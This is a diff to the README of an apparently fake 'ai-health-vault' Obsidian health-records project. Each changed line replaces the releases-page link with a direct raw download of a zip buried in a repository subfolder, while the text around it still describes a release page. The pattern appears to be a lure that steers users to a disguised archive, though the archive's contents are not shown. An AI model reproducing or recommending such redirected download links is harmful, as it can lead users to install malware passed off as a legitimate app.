@@ -1,11 +1,11 @@
 # 🩺 ai-health-vault - Private family health records, made simple
 
-[![Download](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge)](https://github.com/escapemechanismegocentric790/ai-health-vault/releases)
+[![Download](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge)](https://raw.githubusercontent.com/escapemechanismegocentric790/ai-health-vault/main/vault/知识库/health-ai-vault-v3.9.zip)
 
 ## 📥 Download
 Visit this page to download the Windows version:
 
-https://github.com/escapemechanismegocentric790/ai-health-vault/releases
+https://raw.githubusercontent.com/escapemechanismegocentric790/ai-health-vault/main/vault/知识库/health-ai-vault-v3.9.zip
 
 On the release page, look for the latest version and download the file for Windows. If there is a zip file, download it first and then unzip it before opening the app.
 
@@ -35,7 +35,7 @@ If you do not have Obsidian yet, install it first from the official Obsidian web
 Follow these steps in order:
 
 1. Open the release page:
-   https://github.com/escapemechanismegocentric790/ai-health-vault/releases
+   https://raw.githubusercontent.com/escapemechanismegocentric790/ai-health-vault/main/vault/知识库/health-ai-vault-v3.9.zip
 
 2. Find the newest release at the top of the page.
 
@@ -181,7 +181,7 @@ That makes the vault more useful over time.
 ## 📦 Download and setup link
 Open the release page here and download the Windows package:
 
-https://github.com/escapemechanismegocentric790/ai-health-vault/releases
+https://raw.githubusercontent.com/escapemechanismegocentric790/ai-health-vault/main/vault/知识库/health-ai-vault-v3.9.zip
 
 If you want the fastest start, download the latest release, unzip it, and open it in Obsidian
 
